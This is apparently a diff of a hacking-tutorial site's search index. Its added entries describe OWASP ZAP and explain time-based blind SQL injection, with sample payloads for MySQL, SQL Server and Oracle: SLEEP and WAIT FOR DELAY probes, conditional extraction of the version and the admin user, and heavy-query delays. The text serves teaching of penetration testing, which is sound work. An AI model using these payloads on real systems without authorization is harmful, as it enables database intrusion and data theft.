+                content: "What is OWASP ZAP? linkOWASP ZAP is a powerful penetration testing tool designed to help developers and security professionals detect and find vulnerabilities in web applications. It offers multiple security functions, including:\nPassively scanning web requests Using dictionary lists to search for files and folders on web servers Using crawlers to identify a site’s structure and retrieve all links and URLs Intercepting, displaying, modifying, and forwarding web requests between browsers and web applications OWASP ZAP can identify vulnerabilities in web applications such as compromised authentication, exposure of sensitive data, security misconfigurations, SQL injection, cross-site scripting (XSS), insecure deserialization, and components with known vulnerabilities.\n6 Key Capabilities of the OWASP ZAP Tool linkZAP sits between a web application and a penetration testing client, functioning as a proxy to capture data transmitted and determine how the application responds to potentially malicious requests. OWASP ZAP is versatile and can be used by professionals of various skill levels and job roles.\n1. Active vs. Passive Scans linkZAP offers two types of scans—active and passive.\nPassive Scans: These scans check HTTP requests and application responses for known security vulnerabilities without making changes to requests. They pose a low risk as they cannot change data, but may miss aggressive vulnerabilities like SQL Injection (SQLi).\nActive Scans: These scans create and modify requests sent to the application, sending test requests that surface vulnerabilities which cannot be caught using passive scans. Active scans are generally more effective but may create or delete data in the application.\n2. Running Scans: Desktop vs. API linkOWASP ZAP can be deployed as a desktop application or automatically via an API:\nDesktop Application: Ideal for security analysts and penetration testers running one-off tests to detect vulnerabilities. API Automation: Suitable for software development and security teams to ensure regular security testing of applications and their APIs. 3. Authenticated Security Scanning linkFor web applications requiring authentication, ZAP must be configured with authentication credentials to test protected paths. ZAP supports various authentication formats, including:\nForm-based authentication Script-based authentication JSON-based authentication HTTP/NTLM-based authentication 4. WebSockets linkWebSockets create an asynchronous communication channel between client and server, transmitting data in full duplex. This continuous open channel can lead to security vulnerabilities such as eavesdropping or session hijacking. ZAP continuously scans WebSockets to identify these vulnerabilities.\n5. OWASP ZAP Fuzzer linkFuzzing involves sending large volumes of unexpected data inputs to a test application to discover vulnerabilities. ZAP’s fuzzer allows for:\nSelection of built-in payloads Downloading a variety of payloads from the ZAP community Creating custom payloads 6. AJAX Spidering linkAJAX scraping detects requests from AJAX-rich web applications that normal crawlers may miss. ZAP’s AJAX Spider tool, accessible through the tools menu, offers configuration parameters like maximum crawl depth, status, and duration to avoid infinite crawls.\nOWASP ZAP Tutorial: Installation and Initial Configuration linkPrerequisites link Installers: Available for Windows, Linux, and Mac OS/X, as well as Docker images. Download the appropriate installer from the download page. Java 8 or higher: Required to run ZAP. The Mac OS/X installer includes the appropriate Java version, but Java 8+ must be installed separately for Windows, Linux, and cross-platform versions. The Docker version includes Java. Permission: Ensure you have permission from the web application owner to perform a penetration test. Initial Configuration link Start ZAP: Choose whether to make the ZAP session persistent. If persisted, the session is saved to a local HSQLDB; otherwise, files are deleted on logout. Run a quick start auto scan: Start ZAP and click the Quick Launch tab. Click the Auto Scan button. Enter the full URL of the web application in the Attack URL text box. Select either “Use traditional spider,” “Use AJAX spider,” or both. Click Attack. ZAP Spiders linkZAP offers two spiders for scraping web applications:\nTraditional Spider: Inspects HTML in a web application’s response to detect links. It is fast but less effective for AJAX web applications that use JavaScript to generate links. AJAX Spider: Effective for JavaScript applications, it invokes a browser to render the full JavaScript of the page and follows any links. It is slower and requires additional configuration for headless environments. Passive vs. Active Scanning link Passive Scanning: Investigates all proxy requests and responses without changing the response. Safe and can be run in the background, but may miss some vulnerabilities. Active Scanning: Uses known attack vectors against the selected target. Real attacks that might cause damage, should not be used without permission. OWASP ZAP is a comprehensive tool for identifying vulnerabilities in web applications, offering capabilities for both passive and active scanning, authenticated testing, WebSockets scanning, fuzzing, and AJAX spidering. Whether used via a desktop application or automated API, it provides robust support for security professionals to enhance web application security.\n"
+            }
+        );
+    index.add(
+            {
+                id:  36 ,
                 href: "\/tutorials\/docs\/social-engineering-toolkit\/",
                 title: "Social Engineering Toolkit",
                 description: "Learn more about the Social Engineering Toolkit",
@@ -1849,8 +2040,8 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  30 ,
-                href: "\/tutorials\/docs\/owasp-zap\/owasp-zap\/introduction_to_sqlmap\/",
+                id:  37 ,
+                href: "\/tutorials\/docs\/sqlmap\/",
                 title: "SQLMap",
                 description: "Learn more about SQLMap",
                 content: ""
@@ -1858,7 +2049,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  31 ,
+                id:  38 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/text_manipulation\/",
                 title: "Text Manipulation",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1867,7 +2058,25 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  32 ,
+                id:  39 ,
+                href: "\/tutorials\/docs\/sqlmap\/sqlmap\/time_based_blind_attacks\/",
+                title: "Time-Based Blind SQL Injection Attacks",
+                description: "Learn more about SQLMap",
+                content: "Time-based blind SQL injection attacks are a form of SQL injection where the attacker injects a query that causes a time delay in the database response. By observing the time it takes for the server to respond, the attacker can infer information about the database, even if there is no direct feedback from the database server.\nPurpose of Time-Based SQL Injection linkTime-based techniques are particularly useful for blind and deep blind SQL injection attacks where there is no other way to retrieve information from the database server. By injecting SQL code that induces a time delay, attackers can deduce information based on the time taken for the server to respond.\nInjecting a Time Delay linkTime-based attacks can be used to determine if a vulnerability is present. This is especially useful when facing deep blind SQL injection scenarios. The table below shows how to inject a time delay in various database management systems (DBMS).\nDBMS Function Notes MySQL SLEEP(time) Available since MySQL 5.0. Causes the query to sleep for the specified number of seconds. BENCHMARK(count, expr) Executes the expression a specified number of times, generating a delay. SQL Server WAIT FOR DELAY 'hh:mm:ss' Suspends execution for the specified amount of time. WAIT FOR TIME 'hh:mm:ss' Suspends execution until the system time matches the specified time. Oracle DBMS_LOCK.SLEEP(seconds) Used within PL/SQL blocks to suspend execution. Oracle does not support stacked queries in dynamic SQL. Note: Always identify the DBMS before beginning time-based tests. If none of the delay functions work, use database fingerprinting techniques to determine the DBMS.\nConditional Time Delays linkTime-based attacks can also extract information from the database by integrating the time delay into a conditional statement. This allows attackers to ask yes/no questions and deduce information based on whether the delay is executed or not.\nDBMS Conditional Syntax Notes MySQL IF(condition, when_true, when_false) Used in SQL statements. In stored procedures, use Oracle syntax. SQL Server IF condition THEN when_true ELSE when_false Used in stored procedures or independent stacked queries. Oracle IF condition THEN when_true ELSE when_false END IF Used in PL/SQL blocks. Examples of Time-Based SQL Injection linkMySQL Time-Based Attack linkInjecting a time delay in MySQL is straightforward using SLEEP() or BENCHMARK() functions.\nChecking for Vulnerability:\nSELECT * FROM products WHERE id=1 AND SLEEP(15); Extracting Information: To verify the database version:\nSELECT * FROM products WHERE id=1 AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0); SQL Server Time-Based Attack linkSQL Server requires the use of stacked queries to inject time delays.\nChecking for Vulnerability:\nSELECT * FROM products WHERE id=1; WAIT FOR DELAY '00:00:15'; Extracting Information: To check if the user is sa (system administrator):\nSELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:15'; Oracle Time-Based Attack linkOracle uses the DBMS_LOCK.SLEEP procedure within PL/SQL blocks.\nInjecting a Delay:\nBEGIN DBMS_LOCK.SLEEP(15); END; For dynamic SQL queries, inject heavy queries to induce a delay, as Oracle does not support stacked queries.\nPros and Cons of Time-Based Attacks linkPros link Minimal impact on logs compared to error-based attacks. Useful in deep blind SQL injection scenarios. Cons link Heavy queries or CPU-intensive functions like MySQL’s BENCHMARK() may alert system administrators. Requires careful calibration of delay length to account for server load and network speed, ensuring accurate results without excessively long testing times. Conclusion linkTime-based blind SQL injection attacks are a valuable technique for identifying and exploiting SQL injection vulnerabilities when other methods are not feasible. By inducing time delays and using conditional statements, attackers can infer critical information about the database, even without direct feedback. Always ensure responsible and ethical use of these techniques, and obtain proper authorization before conducting any tests.\n"
+            }
+        );
+    index.add(
+            {
+                id:  40 ,
+                href: "\/tutorials\/docs\/sqlmap\/sqlmap\/time_based_blinds_using_heavy_queries\/",
+                title: "Time-Based Blind SQL Injection Using Heavy Queries",
+                description: "Learn more about SQLMap",
+                content: "Overview linkIn some cases, it might be impossible to use time delay functions or procedures for classic time delay injections. In such situations, the best alternative is to simulate a delay using heavy queries, which take a noticeable amount of time to execute. This technique leverages the execution time of complex queries to infer information about the database.\nPrinciple linkThe injected query should rely on system tables, as the attacker usually has no information about user tables. The execution time is prolonged due to the large number of rows returned by the query. The time required to execute these queries can vary significantly based on factors like user permissions, database size, and server performance.\nHeavy Query Steps linkMySQL or SQL Server linkEven though MySQL and SQL Server support functions like SLEEP() to create delays, there might be cases where such functions or characters are blacklisted. In these scenarios, heavy queries can be used.\nHeavy MySQL Query Example:\nSELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C In a test environment, this query might return a large number, taking approximately 10 seconds to execute.\nInjection to Identify Vulnerability:\n1 AND 1\u003e(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) Resulting Query:\nSELECT * FROM products WHERE id=1 AND 1\u003e(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) If the server response takes noticeably longer, it indicates the presence of a vulnerability.\nOracle linkFor Oracle databases, heavy queries are often necessary for time-based SQL injections due to the lack of direct delay functions.\nHeavy Oracle Query Example:\nSELECT count(*) FROM all_users A, all_users B, all_users C In a test environment with a small number of users, this query might execute quickly. However, with a larger number of tables in the FROM clause, the execution time increases.\nInjection to Identify Vulnerability:\n1 AND 1\u003c(SELECT count(*) FROM all_users A, all_users B, all_users C) Resulting Query:\nSELECT * FROM products WHERE id=1 AND 1\u003c(SELECT count(*) FROM all_users A, all_users B, all_users C) A significant delay in server response indicates a potential vulnerability.\nAdditional Information linkUsing heavy queries can significantly impact CPU and server resources. Therefore, it’s generally better to use standard time delay techniques that are less CPU-intensive whenever possible.\nQuery Optimization linkDatabase optimizers execute the injected query once, store the results, and reuse the value when evaluating the WHERE clause against each record. This means the heavy query is not executed repeatedly, which is more efficient. However, if the optimizer detects that the WHERE clause is always false, it may skip the query execution altogether. To avoid this, ensure the WHERE clause is verified for at least one record.\nConclusion linkHeavy queries are a viable alternative to time delay functions for time-based blind SQL injection attacks, especially when delay functions are unavailable or blacklisted. By leveraging complex queries that take longer to execute, attackers can infer the presence of vulnerabilities. However, it is important to consider the impact on server resources and optimize the injected queries accordingly. Always ensure ethical use of these techniques and obtain proper authorization before conducting any tests.\n"
+            }
+        );
+    index.add(
+            {
+                id:  41 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/file_permision_using_linux\/",
                 title: "Understanding File Permissions in Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1876,7 +2085,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  33 ,
+                id:  42 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/payloads_in_metasploit\/",
                 title: "Understanding How Payloads Work in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1885,7 +2094,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  34 ,
+                id:  43 ,
                 href: "\/tutorials\/docs\/john-the-ripper\/john-the-ripper\/introduction_to_john_the_ripper\/",
                 title: "Using John The Ripper",
                 description: "Learn how to use John The Ripper to crack passwords.",
